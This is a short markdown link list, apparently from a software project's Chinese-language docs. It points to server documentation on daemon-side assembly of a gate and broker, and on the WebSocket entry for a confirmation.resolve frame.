- [../server/run-manager.md](../server/run-manager.md)：gate + broker 的 daemon 侧装配
- [../server/realtime.md](../server/realtime.md)：confirmation.resolve 帧的 WS 入口
